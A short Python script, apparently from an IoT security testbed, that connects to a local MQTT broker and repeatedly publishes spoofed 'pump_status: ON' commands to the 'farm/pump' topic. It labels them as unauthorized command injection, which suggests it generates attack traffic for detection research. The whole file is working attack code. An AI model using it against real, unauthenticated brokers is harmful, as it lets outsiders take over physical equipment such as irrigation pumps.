import json
import threading
import time
from paho.mqtt import client as mqtt_client

BROKER = "localhost"
PORT = 1883
TOPIC = "farm/pump"

client = mqtt_client.Client(
    mqtt_client.CallbackAPIVersion.VERSION2,
    client_id="command-attacker"
)

client.connect(BROKER, PORT)
client.loop_start()

running = False

def command_loop():
    while running:
        payload = {
            "device": "command-attacker",
            "packet_type": "command_injection",
            "timestamp": time.time(),
            "pump_status": "ON",
            "source": "unauthorized"
        }

        client.publish(TOPIC, json.dumps(payload))
        print(f"⚠️ False Command -> {payload}")

        time.sleep(2)

def start_command_attack():
    global running
    if running:
        return

    running = True
    threading.Thread(target=command_loop, daemon=True).start()

def stop_command_attack():
    global running
    running = False